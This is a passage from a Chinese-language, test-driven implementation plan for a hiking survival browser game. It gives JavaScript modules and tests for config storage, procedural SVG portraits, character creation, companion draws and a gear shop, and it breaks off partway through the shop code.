- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/config.test.js`
Expected: FAIL — 模块不存在

- [ ] **Step 3: 写实现**

`src/ui/config.js`：

```js
import { PRESETS } from '../llm/client.js'

export const CONFIG_KEY = 'aotai_config'

const CONFIG_DEFAULTS = { presetId: 'deepseek', apiKey: '', baseURL: '', model: '', temperature: 0.8, maxTokens: 2048 }

export function normalizeConfig(raw = {}) {
  const c = { ...CONFIG_DEFAULTS, ...raw }
  const 预设 = PRESETS.find((p) => p.id === c.presetId)
  if (预设) {
    if (!c.baseURL) c.baseURL = 预设.baseURL
    if (!c.model) c.model = 预设.默认模型
  }
  return c
}

export function validateConfig(raw) {
  const c = normalizeConfig(raw)
  const 问题 = []
  if (!c.apiKey) 问题.push('还没填 API key')
  if (!/^https?:\/\//.test(c.baseURL || '')) 问题.push('baseURL 必须以 http:// 或 https:// 开头')
  if (!c.model) 问题.push('还没选模型')
  return { ok: 问题.length === 0, 问题, config: c }
}

export function loadConfig(storage) {
  try {
    const 原文 = storage.getItem(CONFIG_KEY)
    if (!原文) return normalizeConfig({})
    return normalizeConfig(JSON.parse(原文))
  } catch {
    return normalizeConfig({})
  }
}

export function saveConfig(storage, config) {
  storage.setItem(CONFIG_KEY, JSON.stringify(normalizeConfig(config)))
}

// 界面上只显示脱敏后的 key。完整值不进 DOM——DOM 里的东西
// 截图、录屏、分享页面时都会一起出去。
function 脱敏(key) {
  if (!key) return ''
  if (key.length <= 8) return key.slice(0, 3) + '****'
  return `${key.slice(0, 3)}${'*'.repeat(8)}${key.slice(-4)}`
}

export function configViewModel(raw) {
  const c = normalizeConfig(raw)
  const v = validateConfig(c)
  return {
    config: c,
    预设: PRESETS.map((p) => ({ id: p.id, 名称: p.名称, baseURL: p.baseURL, 默认模型: p.默认模型, 选中: p.id === c.presetId })),
    key脱敏: 脱敏(c.apiKey),
    可用: v.ok,
    问题: v.问题,
  }
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/config.test.js`
Expected: PASS，10 个测试全绿

- [ ] **Step 5: 登记并提交**

`build.mjs` 的 `MODULE_ORDER` 末尾追加 `'src/ui/config.js',`。

```bash
git add src/ui/config.js test/config.test.js build.mjs
git commit -m "feat: API 配置的视图模型与本地存取

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

## 阶段三 · 立绘与准备三屏

### Task 9: 程序化立绘占位

没有美术资源也要能玩，且每个人得能一眼分清。做法：拿 `npcId` 做确定性哈希，生成稳定的色相与剪影几何——陈岩永远是那个偏冷灰的宽肩剪影，每次打开都一样。有真图时（`assets/portraits/{npcId}.png`）自动顶替。

**Files:**
- Create: `src/ui/portrait.js`
- Create: `docs/portrait-prompts.md`
- Modify: `build.mjs`
- Test: `test/portrait.test.js`

- [ ] **Step 1: 写失败的测试**

`test/portrait.test.js`：

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { portraitSeed, portraitTheme, portraitSvg, portraitPath } from '../src/ui/portrait.js'
import { NPCS } from '../src/data/npcs.js'

test('同一 id 恒得同一种子，不同 id 基本不撞', () => {
  assert.equal(portraitSeed('chenyan'), portraitSeed('chenyan'))
  const 种子 = new Set(NPCS.map((n) => portraitSeed(n.id)))
  assert.ok(种子.size >= NPCS.length - 1, `12 人里撞了太多：${种子.size}`)
})

test('主题给出色相与剪影参数，且落在合法区间', () => {
  for (const n of NPCS) {
    const t = portraitTheme(n.id)
    assert.ok(t.色相 >= 0 && t.色相 < 360, `${n.id} 色相越界 ${t.色相}`)
    assert.ok(t.肩宽 >= 0.5 && t.肩宽 <= 1, `${n.id} 肩宽越界`)
    assert.ok(typeof t.主色 === 'string' && t.主色.startsWith('hsl('))
  }
})

test('12 个人的色相拉得开，不会看起来都一样', () => {
  const 色相 = NPCS.map((n) => portraitTheme(n.id).色相).sort((a, b) => a - b)
  let 最小间隔 = 360
  for (let i = 1; i < 色相.length; i++) 最小间隔 = Math.min(最小间隔, 色相[i] - 色相[i - 1])
  assert.ok(最小间隔 >= 8, `有两人色相只差 ${最小间隔} 度，肉眼分不出`)
})

test('生成的是合法 SVG 且不含可执行内容', () => {
  const svg = portraitSvg('chenyan')
  assert.ok(svg.startsWith('<svg'))
  assert.ok(svg.includes('</svg>'))
  assert.ok(!/<script/i.test(svg), 'SVG 里不该有脚本')
  assert.ok(!/on\w+=/i.test(svg), 'SVG 里不该有事件属性')
})

test('立绘路径按约定拼，状态层可选', () => {
  assert.equal(portraitPath('chenyan'), 'assets/portraits/chenyan.png')
  assert.equal(portraitPath('chenyan', 'hurt'), 'assets/portraits/chenyan_hurt.png')
})

test('主角用性别加种子，不与任何 NPC 撞', () => {
  const 男 = portraitTheme('pc:男:7')
  const 女 = portraitTheme('pc:女:7')
  assert.notEqual(男.色相, 女.色相)
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/portrait.test.js`
Expected: FAIL — 模块不存在

- [ ] **Step 3: 写实现**

`src/ui/portrait.js`：

```js
// 程序化立绘占位。没有美术资源也要能玩，且 12 个人得一眼分得清。
// 同一 id 恒定生成同一张——陈岩每次打开都是那个偏冷灰的宽肩剪影。

// FNV-1a：短字符串上分布够均匀，实现只要几行
export function portraitSeed(id) {
  let h = 2166136261
  for (let i = 0; i < id.length; i++) {
    h ^= id.charCodeAt(i)
    h = Math.imul(h, 16777619)
  }
  return h >>> 0
}

// 色相用黄金角步进而不是取模：取模会让相邻 id 挤在一起，
// 黄金角能把 12 个人尽量摊开。
const 黄金角 = 137.508

export function portraitTheme(id) {
  const s = portraitSeed(id)
  const 色相 = Math.round((s % 997) * 黄金角) % 360
  const 肩宽 = 0.55 + ((s >> 8) % 40) / 100
  const 头大 = 0.28 + ((s >> 16) % 12) / 100
  return {
    色相,
    肩宽,
    头大,
    主色: `hsl(${色相}, 22%, 38%)`,
    暗色: `hsl(${色相}, 20%, 16%)`,
  }
}

export function portraitSvg(id) {
  const t = portraitTheme(id)
  const 肩 = Math.round(t.肩宽 * 100)
  const 头 = Math.round(t.头大 * 100)
  return [
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 160" preserveAspectRatio="xMidYMax meet">',
    `<defs><linearGradient id="g${id.replace(/[^a-z0-9]/gi, '')}" x1="0" y1="0" x2="0" y2="1">`,
    `<stop offset="0" stop-color="${t.主色}"/><stop offset="1" stop-color="${t.暗色}"/>`,
    '</linearGradient></defs>',
    `<rect width="120" height="160" fill="${t.暗色}"/>`,
    `<circle cx="60" cy="${58 - 头 / 4}" r="${头 * 0.32}" fill="url(#g${id.replace(/[^a-z0-9]/gi, '')})"/>`,
    `<path d="M60 ${72 - 头 / 8} C ${60 - 肩 * 0.6} ${86} ${60 - 肩 * 0.62} 120 ${60 - 肩 * 0.55} 160 L ${60 + 肩 * 0.55} 160 C ${60 + 肩 * 0.62} 120 ${60 + 肩 * 0.6} 86 60 ${72 - 头 / 8} Z" fill="url(#g${id.replace(/[^a-z0-9]/gi, '')})"/>`,
    '</svg>',
  ].join('')
}

export function portraitPath(npcId, 状态) {
  return `assets/portraits/${npcId}${状态 ? '_' + 状态 : ''}.png`
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/portrait.test.js`
Expected: PASS，6 个测试全绿

- [ ] **Step 5: 写 12 份生图 prompt**

`docs/portrait-prompts.md`。为 10 位随机配角与 2 位重要配角各写一份，全部照 `src/data/npcs.js` 里的年龄/职业/性格/状态撰写。统一前缀：

```
半身立绘，3:4，透明背景，512×768。中国秦岭高山徒步场景，深秋，冷色调。
写实厚涂，不要动漫脸。人物穿户外装备，肩背登山包。视线朝向观者偏侧。
```

每人再补一段特征。示例（陈岩）：

```
42 岁男性地质勘探员。沉稳谨慎，寡言但可靠。晒得黑，颧骨明显，眼神平静。
灰绿硬壳冲锋衣，胸前挂罗盘，肩上勘探包。手里握一根登山杖。状态：正常。
```

其余 11 人照此格式写全，不得留空。**主角不写**——第一人称不上立绘舞台（见 spec 第 11 节）。

- [ ] **Step 6: 登记并提交**

`build.mjs` 的 `MODULE_ORDER` 末尾追加 `'src/ui/portrait.js',`。

```bash
git add src/ui/portrait.js docs/portrait-prompts.md test/portrait.test.js build.mjs
git commit -m "feat: 程序化立绘占位与 12 份生图 prompt

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 10: 捏人

**Files:**
- Create: `src/ui/screen-create.js`
- Modify: `build.mjs`
- Test: `test/screen-create.test.js`

户外经验由职业、技能数、年龄推算，可手调 ±10。

- [ ] **Step 1: 写失败的测试**

`test/screen-create.test.js`：

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { deriveExperience, createViewModel, validateDraft, randomDraft, EXPERIENCE_JOBS } from '../src/ui/screen-create.js'
import { PERSONALITY_TAGS } from '../src/data/npcs.js'
import { makeRng } from '../src/engine/rng.js'

const 草稿 = (over = {}) => ({
  名字: '周野', 职业: '户外器材工程师', 年龄: 28, 性别: '男',
  性格: 'renside', 外貌: '偏瘦，晒得黑', 技能: ['装备维修', '路线规划', '生火'],
  经验微调: 0, ...over,
})

test('户外经验落在 0-100 且随职业变化', () => {
  const 高 = deriveExperience({ ...草稿(), 职业: '退役登山教练' })
  const 低 = deriveExperience({ ...草稿(), 职业: '大学历史教授' })
  assert.ok(高 > 低, `登山教练(${高}) 应高于历史教授(${低})`)
  for (const 职业 of Object.keys(EXPERIENCE_JOBS)) {
    const v = deriveExperience({ ...草稿(), 职业 })
    assert.ok(v >= 0 && v <= 100, `${职业} 越界 ${v}`)
  }
})

test('技能越多经验越高，但边际递减不至于爆表', () => {
  const 一技 = deriveExperience({ ...草稿(), 技能: ['生火'] })
  const 三技 = deriveExperience({ ...草稿(), 技能: ['生火', '装备维修', '路线规划'] })
  assert.ok(三技 > 一技)
  assert.ok(三技 <= 100)
})

test('年龄影响经验但不是线性叠加', () => {
  const 少年 = deriveExperience({ ...草稿(), 年龄: 19 })
  const 中年 = deriveExperience({ ...草稿(), 年龄: 45 })
  assert.ok(中年 > 少年)
})

test('微调只允许 ±10', () => {
  const 基础 = deriveExperience(草稿())
  assert.equal(deriveExperience(草稿({ 经验微调: 10 })), Math.min(100, 基础 + 10))
  assert.equal(deriveExperience(草稿({ 经验微调: 999 })), Math.min(100, 基础 + 10))
  assert.equal(deriveExperience(草稿({ 经验微调: -999 })), Math.max(0, 基础 - 10))
})

test('校验：名字必填', () => {
  const r = validateDraft(草稿({ 名字: '  ' }))
  assert.equal(r.ok, false)
  assert.ok(r.问题.some((x) => x.includes('名字')))
})

test('校验：技能必须正好 3 个', () => {
  assert.equal(validateDraft(草稿({ 技能: ['生火'] })).ok, false)
  assert.equal(validateDraft(草稿({ 技能: ['a', 'b', 'c', 'd'] })).ok, false)
  assert.equal(validateDraft(草稿()).ok, true)
})

test('校验：性格必须是合法标签', () => {
  assert.equal(validateDraft(草稿({ 性格: '查无此性格' })).ok, false)
})

test('校验：年龄要在合理区间', () => {
  assert.equal(validateDraft(草稿({ 年龄: 8 })).ok, false)
  assert.equal(validateDraft(草稿({ 年龄: 120 })).ok, false)
})

test('随机捏人产出的草稿必定合法', () => {
  for (let i = 0; i < 50; i++) {
    const d = randomDraft(makeRng(i))
    const r = validateDraft(d)
    assert.equal(r.ok, true, `第 ${i} 次随机不合法：${r.问题.join('、')}`)
  }
})

test('随机捏人同种子可复现', () => {
  assert.deepEqual(randomDraft(makeRng(3)), randomDraft(makeRng(3)))
})

test('视图模型带出全部性格标签与推算出的经验', () => {
  const vm = createViewModel(草稿())
  assert.equal(vm.性格标签.length, PERSONALITY_TAGS.length)
  assert.equal(vm.性格标签.find((t) => t.选中).id, 'renside')
  assert.equal(vm.户外经验, deriveExperience(草稿()))
  assert.equal(vm.可继续, true)
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/screen-create.test.js`
Expected: FAIL — 模块不存在

- [ ] **Step 3: 写实现**

`src/ui/screen-create.js`：

```js
import { PERSONALITY_TAGS } from '../data/npcs.js'
import { rollInt } from '../engine/rng.js'

// 职业底子。数值是设计取值，不来自源文档——文档只规定「必须生成初始属性」，
// 没说怎么算。首轮试玩后按手感调。
export const EXPERIENCE_JOBS = {
  '退役登山教练': 55, '护林员': 45, '地质勘探员': 42, '越野跑爱好者': 38,
  '户外器材工程师': 34, '摄影师': 30, '急诊科护士': 26, '户外博主': 24,
  '私企老板': 20, '大学生': 16, '大学历史教授': 12,
}

const CREATE_SKILL_POOL = [
  '装备维修', '路线规划', '生火', '急救处理', '野外定位', '气象观察',
  '绳索技术', '寻找水源', '摄影', '超强耐力', '心理安抚', '资源统筹',
]

const CREATE_NAME_POOL = ['周野', '陆青', '沈遇', '许川', '林拓', '苏行', '章屿', '傅岭']
const CREATE_LOOK_POOL = [
  '偏瘦，晒得黑，左手虎口有旧疤', '个子不高，肩很宽，走路脚步很沉',
  '高瘦，戴细框眼镜，说话时习惯低头', '结实，络腮胡，笑起来眼角全是纹',
]

const 经验微调上限 = 10

export function deriveExperience(draft) {
  const 底子 = EXPERIENCE_JOBS[draft.职业] ?? 25
  // 技能边际递减：第 1 个 +6，第 2 个 +4，第 3 个 +3
  const 技能加成 = [6, 4, 3].slice(0, (draft.技能 || []).length).reduce((a, b) => a + b, 0)
  // 年龄按 25 岁为基准，每多 1 岁 +0.4，40 岁后不再增长（体能开始抵消经验）
  const 年龄 = Math.min(draft.年龄 ?? 25, 40)
  const 年龄加成 = Math.round((年龄 - 25) * 0.4)
  const 微调 = Math.max(-经验微调上限, Math.min(经验微调上限, draft.经验微调 || 0))
  return Math.max(0, Math.min(100, 底子 + 技能加成 + 年龄加成 + 微调))
}

export function validateDraft(draft) {
  const 问题 = []
  if (!String(draft.名字 || '').trim()) 问题.push('名字还没填')
  if (!String(draft.职业 || '').trim()) 问题.push('职业还没填')
  const 年龄 = Number(draft.年龄)
  if (!Number.isFinite(年龄) || 年龄 < 16 || 年龄 > 70) 问题.push('年龄要在 16 到 70 之间')
  if (!['男', '女'].includes(draft.性别)) 问题.push('还没选性别')
  if (!PERSONALITY_TAGS.some((t) => t.id === draft.性格)) 问题.push('还没选性格')
  if (!String(draft.外貌 || '').trim()) 问题.push('外貌还没填')
  if ((draft.技能 || []).length !== 3) 问题.push('技能要正好选 3 个')
  return { ok: 问题.length === 0, 问题 }
}

export function randomDraft(rng) {
  const 职业表 = Object.keys(EXPERIENCE_JOBS)
  const 技能 = []
  const 池 = [...CREATE_SKILL_POOL]
  for (let i = 0; i < 3; i++) 技能.push(...池.splice(rollInt(rng, 0, 池.length - 1), 1))
  return {
    名字: CREATE_NAME_POOL[rollInt(rng, 0, CREATE_NAME_POOL.length - 1)],
    职业: 职业表[rollInt(rng, 0, 职业表.length - 1)],
    年龄: rollInt(rng, 22, 48),
    性别: rollInt(rng, 0, 1) === 0 ? '男' : '女',
    性格: PERSONALITY_TAGS[rollInt(rng, 0, PERSONALITY_TAGS.length - 1)].id,
    外貌: CREATE_LOOK_POOL[rollInt(rng, 0, CREATE_LOOK_POOL.length - 1)],
    技能,
    经验微调: 0,
  }
}

export function createViewModel(draft) {
  const v = validateDraft(draft)
  return {
    draft,
    性格标签: PERSONALITY_TAGS.map((t) => ({ id: t.id, 文案: t.文案, 选中: t.id === draft.性格 })),
    技能池: CREATE_SKILL_POOL.map((s) => ({ 名称: s, 选中: (draft.技能 || []).includes(s) })),
    职业表: Object.keys(EXPERIENCE_JOBS),
    户外经验: deriveExperience(draft),
    可继续: v.ok,
    问题: v.问题,
  }
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/screen-create.test.js`
Expected: PASS，11 个测试全绿

- [ ] **Step 5: 登记并提交**

`build.mjs` 的 `MODULE_ORDER` 末尾追加 `'src/ui/screen-create.js',`。

```bash
git add src/ui/screen-create.js test/screen-create.test.js build.mjs
git commit -m "feat: 捏人的视图模型与经验推算

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 11: 抽卡

从 10 位随机配角里抽 2 个，初始好感由性格匹配度算，限重抽 1 次。

**Files:**
- Create: `src/ui/screen-draw.js`
- Modify: `build.mjs`
- Test: `test/screen-draw.test.js`

- [ ] **Step 1: 写失败的测试**

`test/screen-draw.test.js`：

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { drawCompanions, drawViewModel, MAX_REDRAW } from '../src/ui/screen-draw.js'
import { RANDOM_POOL, getNpc } from '../src/data/npcs.js'
import { initialAffinity } from '../src/engine/affinity.js'
import { makeRng } from '../src/engine/rng.js'

test('抽出 2 个不重复的随机配角', () => {
  for (let i = 0; i < 60; i++) {
    const 抽 = drawCompanions(makeRng(i), 'renside')
    assert.equal(抽.length, 2)
    assert.notEqual(抽[0].npcId, 抽[1].npcId)
    for (const c of 抽) assert.ok(RANDOM_POOL.includes(c.npcId), `抽到了池外的人 ${c.npcId}`)
  }
})

test('两位重要配角永远不会被抽到', () => {
  for (let i = 0; i < 200; i++) {
    for (const c of drawCompanions(makeRng(i), 'renside')) {
      assert.ok(c.npcId !== 'taxue' && c.npcId !== 'mengshe', `重要配角不该出现在开局抽卡：${c.npcId}`)
    }
  }
})

test('同种子可复现', () => {
  assert.deepEqual(drawCompanions(makeRng(9), 'renside'), drawCompanions(makeRng(9), 'renside'))
})

test('初始好感取自性格匹配度，不是固定值', () => {
  const 抽 = drawCompanions(makeRng(4), 'renside')
  for (const c of 抽) {
    assert.equal(c.好感, initialAffinity('renside', c.npcId))
  }
  // 换个性格重抽同一批人，好感应当不同
  const 另一性格 = drawCompanions(makeRng(4), 'zilaishu')
  assert.deepEqual(另一性格.map((c) => c.npcId), 抽.map((c) => c.npcId), '同种子应抽到同一批人')
  assert.ok(另一性格.some((c, i) => c.好感 !== 抽[i].好感), '换了性格好感却没变')
})

test('不同性格对同一个人给出不同初始好感', () => {
  const a = initialAffinity('renside', 'chenyan')
  const b = initialAffinity('zilaishu', 'chenyan')
  assert.notEqual(a, b, '性格轴没起作用')
})

test('十个人都有机会被抽到，不是只在头几个里打转', () => {
  const 出现 = new Set()
  for (let i = 0; i < 400; i++) for (const c of drawCompanions(makeRng(i), 'renside')) 出现.add(c.npcId)
  assert.equal(出现.size, RANDOM_POOL.length, `只抽到 ${出现.size} 种人`)
})

test('视图模型带出卡片所需的全部字段', () => {
  const vm = drawViewModel(drawCompanions(makeRng(1), 'renside'), 0)
  assert.equal(vm.卡片.length, 2)
  for (const 卡 of vm.卡片) {
    const npc = getNpc(卡.npcId)
    assert.equal(卡.名称, npc.名称)
    assert.equal(卡.职业, npc.职业)
    assert.deepEqual(卡.技能, npc.技能)
    assert.equal(卡.状态, npc.状态)
    assert.ok(卡.立绘, '缺立绘占位')
    assert.equal(typeof 卡.好感, 'number')
  }
})

test('重抽次数用尽后不再允许重抽', () => {
  assert.equal(drawViewModel([], 0).可重抽, true)
  assert.equal(drawViewModel([], MAX_REDRAW).可重抽, false)
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/screen-draw.test.js`
Expected: FAIL — 模块不存在

- [ ] **Step 3: 写实现**

`src/ui/screen-draw.js`：

```js
import { RANDOM_POOL, getNpc } from '../data/npcs.js'
import { initialAffinity } from '../engine/affinity.js'
import { rollInt } from '../engine/rng.js'
import { portraitSvg } from './portrait.js'

export const MAX_REDRAW = 1

const 抽取人数 = 2

// 从 10 位随机配角里抽 2 个。两位重要配角（踏雪、猛蛇过江）不在池里——
// 他们要在途中遭遇，开局就同行会毁掉那份分量。
export function drawCompanions(rng, 性格id) {
  const 池 = [...RANDOM_POOL]
  const 结果 = []
  for (let i = 0; i < 抽取人数; i++) {
    const [id] = 池.splice(rollInt(rng, 0, 池.length - 1), 1)
    结果.push({ npcId: id, 好感: initialAffinity(性格id, id) })
  }
  return 结果
}

export function drawViewModel(抽到, 已重抽次数) {
  return {
    卡片: 抽到.map((c) => {
      const npc = getNpc(c.npcId)
      return {
        npcId: c.npcId,
        名称: npc.名称,
        年龄: npc.年龄,
        职业: npc.职业,
        技能: npc.技能,
        性格: npc.性格,
        状态: npc.状态,
        好感: c.好感,
        带伤: npc.状态 !== '正常',
        立绘: portraitSvg(c.npcId),
      }
    }),
    可重抽: 已重抽次数 < MAX_REDRAW,
    剩余重抽: Math.max(0, MAX_REDRAW - 已重抽次数),
  }
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `npm test -- test/screen-draw.test.js`
Expected: PASS，8 个测试全绿

- [ ] **Step 5: 登记并提交**

`build.mjs` 的 `MODULE_ORDER` 末尾追加 `'src/ui/screen-draw.js',`。

```bash
git add src/ui/screen-draw.js test/screen-draw.test.js build.mjs
git commit -m "feat: 抽卡与按性格匹配度计算的初始好感

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>"
```

---

### Task 12: 商店

文档那张表变成可交互界面。三档价格行内切换、实时总价总重双进度条、按季节生成的警告与缺件清单、买不起的东西标红写明还差多少。

**这是整个准备阶段的设计核心**：钱只够买约 45%，而水和口粮便宜又压秤——省钱的路线撞重量，轻装的路线撞预算。视图模型要把这份张力如实算出来。

**Files:**
- Create: `src/ui/screen-shop.js`
- Modify: `build.mjs`
- Test: `test/screen-shop.test.js`

- [ ] **Step 1: 写失败的测试**

`test/screen-shop.test.js`：

```js
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { shopViewModel, toggleItem, setTier, cartTotals, recommendedCart, START_MONEY } from '../src/ui/screen-shop.js'
import { GEAR, EXTRA_GEAR, getGear, tierOf } from '../src/data/gear.js'

const 空车 = () => ({})

test('起始金钱是文档定的 1 万', () => {
  assert.equal(START_MONEY, 10000)
})

test('空车时总价总重都是 0', () => {
  assert.deepEqual(cartTotals(空车()), { 总价: 0, 总重: 0, 件数: 0 })
})

test('加入一件按所选档计价计重', () => {
  const 车 = toggleItem(空车(), 'backpack', '主流')
  const t = cartTotals(车)
  assert.equal(t.总价, tierOf('backpack', '主流').价格)
  assert.equal(t.总重, tierOf('backpack', '主流').重量)
  assert.equal(t.件数, 1)
})

test('再点一次即移除', () => {
  let 车 = toggleItem(空车(), 'backpack', '主流')
  车 = toggleItem(车, 'backpack', '主流')
  assert.deepEqual(cartTotals(车), { 总价: 0, 总重: 0, 件数: 0 })
})

test('换档只改档次，不会变成两件', () => {
  let 车 = toggleItem(空车(), 'backpack', '主流')
  车 = setTier(车, 'backpack', '经济')
  const t = cartTotals(车)
  assert.equal(t.件数, 1)
  assert.equal(t.总价, tierOf('backpack', '经济').价格)
  assert.equal(t.总重, tierOf('backpack', '经济').重量)
})

test('对不在车里的物品换档是空操作', () => {
  const 车 = setTier(空车(), 'backpack', '经济')
  assert.equal(cartTotals(车).件数, 0)
})

test('浮点不出毛刺', () => {
  let 车 = 空车()
  for (const id of ['emergency_blanket', 'ibuprofen', 'ors']) 车 = toggleItem(车, id, '基础')
  assert.equal(cartTotals(车).总重, 0.15)
})

test('买不起的物品标出还差多少', () => {
  let 车 = 空车()
  // 先花掉大部分预算
  车 = toggleItem(车, 'gps', '专业必备')
  车 = toggleItem(车, 'hardshell', '专业')
  车 = toggleItem(车, 'tent', '轻量')
  车 = toggleItem(车, 'sleeping_bag', '轻量')
  车 = toggleItem(车, 'backpack', '轻量')
  const vm = shopViewModel({ cart: 车, 季节: '秋季' })
  const 买不起 = vm.分类.flatMap((c) => c.物品).filter((i) => i.买不起)
  assert.ok(买不起.length > 0, '花掉大半预算后应该有买不起的东西')
  for (const i of 买不起) assert.ok(i.还差 > 0, `${i.id} 标了买不起却没写还差多少`)
})

test('已在车里的物品不会被标成买不起', () => {
  let 车 = 空车()
  for (const g of GEAR) 车 = toggleItem(车, g.id, g.档次[g.档次.length - 1].档)
  const vm = shopViewModel({ cart: 车, 季节: '秋季' })
  for (const i of vm.分类.flatMap((c) => c.物品)) {
    if (i.已选) assert.equal(i.买不起, false, `${i.id} 已在车里却标了买不起`)
  }
})

test('超重会被标记，且给出超出多少', () => {
  let 车 = 空车()
  for (const g of [...GEAR, ...EXTRA_GEAR]) 车 = toggleItem(车, g.id, g.档次[0].档)
  const vm = shopViewModel({ cart: 车, 季节: '冬季' })
  assert.equal(vm.超重, true)
  assert.ok(vm.超出重量 > 0)
})

test('分类按文档七大类加扩充分组，且不丢件', () => {
  const vm = shopViewModel({ cart: 空车(), 季节: '秋季' })
  const 总数 = vm.分类.reduce((s, c) => s + c.物品.length, 0)
  assert.equal(总数, GEAR.length + EXTRA_GEAR.length)
  for (const c of ['背负系统', '睡眠系统', '炊饮系统', '穿着系统', '关键装备', '医疗用品', '食物']) {
    assert.ok(vm.分类.some((x) => x.名称 === c), `缺分类 ${c}`)
  }
})

test('季节警告直接来自引擎，不在这里重写一遍', () => {
  const vm = shopViewModel({ cart: 空车(), 季节: '冬季' })
  assert.ok(vm.警告.some((w) => w.includes('冰爪')))
  assert.ok(vm.警告.some((w) => w.includes('求救')))
})

test('缺件清单点名必备品', () => {
  const vm = shopViewModel({ cart: 空车(), 季节: '秋季' })
  for (const id of ['backpack', 'tent', 'sleeping_bag', 'staple_food']) {
    assert.ok(vm.缺件.some((m) => m.id === id), `缺件清单里没有 ${id}`)
  }
})

test('买齐必备后缺件清单为空', () => {
  let 车 = 空车()
  for (const id of ['backpack', 'tent', 'sleeping_bag', 'sleeping_pad', 'stove', 'staple_food', 'headlamp', 'first_aid', 'water_filter']) {
    车 = toggleItem(车, id, getGear(id).档次[0].档)
  }
  const vm = shopViewModel({ cart: 车, 季节: '秋季' })
  assert.deepEqual(vm.缺件, [])
})

test('一键推荐配置买得起、不超重、且没有缺件', () => {
  for (const 季节 of ['春季', '夏季', '秋季', '冬季']) {
    const 车 = recommendedCart(季节)
    const vm = shopViewModel({ cart: 车, 季节 })
    assert.ok(vm.总价 <= START_MONEY, `${季节} 推荐配置超预算 ${vm.总价}`)
    assert.equal(vm.超重, false, `${季节} 推荐配置超重 ${vm.总重}`)
    assert.deepEqual(vm.缺件, [], `${季节} 推荐配置有缺件`)
  }
})

test('推荐配置必须配上求救设备，不许留着那条警告', () => {
  for (const 季节 of ['春季', '夏季', '秋季', '冬季']) {
    const vm = shopViewModel({ cart: recommendedCart(季节), 季节 })
    assert.ok(!vm.警告.some((w) => w.includes('求救')),
      `${季节} 推荐配置剩着 ¥${vm.剩余} 却没配求救设备`)
  }
})

test('推荐配置在春冬季会带上冰爪雪套', () => {
  for (const 季节 of ['春季', '冬季']) {
    const 车 = recommendedCart(季节)
    assert.ok(车.crampons, `${季节} 推荐配置没带冰爪`)
    assert.ok(车.gaiters, `${季节} 推荐配置没带雪套`)
  }
  assert.equal(recommendedCart('夏季').crampons, undefined, '夏季不该带冰爪')
})

test('出发按钮在有缺件或超支超重时禁用', () => {
  assert.equal(shopViewModel({ cart: 空车(), 季节: '秋季' }).可出发, false)
  const vm = shopViewModel({ cart: recommendedCart('秋季'), 季节: '秋季' })
  assert.equal(vm.可出发, true)
})

test('转成 createInitialState 要的背包格式', () => {
  const vm = shopViewModel({ cart: recommendedCart('秋季'), 季节: '秋季' })
  assert.ok(vm.背包.length > 0)
  for (const it of vm.背包) {
    assert.ok(it.gearId && it.档 && it.数量 >= 1)
    assert.ok(tierOf(it.gearId, it.档), `${it.gearId}/${it.档} 不是合法档次`)
  }
})
```

- [ ] **Step 2: 跑测试确认失败**

Run: `npm test -- test/screen-shop.test.js`
Expected: FAIL — 模块不存在

- [ ] **Step 3: 写实现**

`src/ui/screen-shop.js`：

```js
import { GEAR, EXTRA_GEAR, ALL_GEAR, getGear, tierOf } from '../data/gear.js'
import { gearWarnings } from '../data/seasons.js'

export const START_MONEY = 10000
const SHOP_CARRY_LIMIT = 30

// 没有它就上不了山的东西。缺件清单点名的就是这些。
const SHOP_ESSENTIALS = ['backpack', 'tent', 'sleeping_bag', 'sleeping_pad', 'stove', 'staple_food', 'headlamp', 'first_aid', 'water_filter']

// 购物车形状：{ [gearId]: 档名 }。用最扁的结构，存档和比对都省事。
export function toggleItem(cart, gearId, 档) {
  const 新 = { ...cart }
  if (新[gearId]) delete 新[gearId]
  else 新[gearId] = 档
  return 新
}

export function setTier(cart, gearId, 档) {
  if (!cart[gearId]) return cart
  if (!tierOf(gearId, 档)) return cart
  return { ...cart, [gearId]: 档 }
}

export function cartTotals(cart) {
  let 总价 = 0
  let 总重 = 0
  let 件数 = 0
  for (const [gearId, 档] of Object.entries(cart)) {
    const t = tierOf(gearId, 档)
    if (!t) continue
    总价 += t.价格
    总重 += t.重量
    件数 += 1
  }
  return { 总价, 总重: Math.round(总重 * 100) / 100, 件数 }
}

// 一键推荐：先按必备件挑最便宜的档，再按季节补关键装备，最后补食物。
// 约束是硬的——必须买得起、不超重、无缺件，否则这个按钮就是在坑玩家。
export function recommendedCart(季节) {
  let cart = {}
  for (const id of SHOP_ESSENTIALS) {
    const g = getGear(id)
    if (g) cart[id] = g.档次[0].档
  }
  cart.freeze_dried = getGear('freeze_dried').档次[0].档
  cart.trail_snack = getGear('trail_snack').档次[0].档
  cart.emergency_blanket = '基础'
  cart.ibuprofen = '基础'
  cart.ors = '基础'
  if (季节 === '春季' || 季节 === '冬季') {
    cart.crampons = '通用'
    cart.gaiters = '通用'
  }
  if (季节 === '夏季') cart.mosquito_repellent = '通用'

  // 求救设备排在所有升级之前。源文档四个季节的「推荐准备」里都写了卫星通讯设备，
  // 而卫星电话只要 ¥750——一个剩着一半预算却不给配求救设备的「推荐」，是在害人。
  // 缺件清单里不放它（要不要冒这个险是玩家的选择），但推荐配置必须给。
  const 可加 = [['sat_phone', '租用'], ['sleeping_bag', '主流'], ['water_filter', '主流'], ['headlamp', '主流'], ['bag_liner', '通用']]
  for (const [id, 档] of 可加) {
    const 试 = { ...cart, [id]: 档 }
    const t = cartTotals(试)
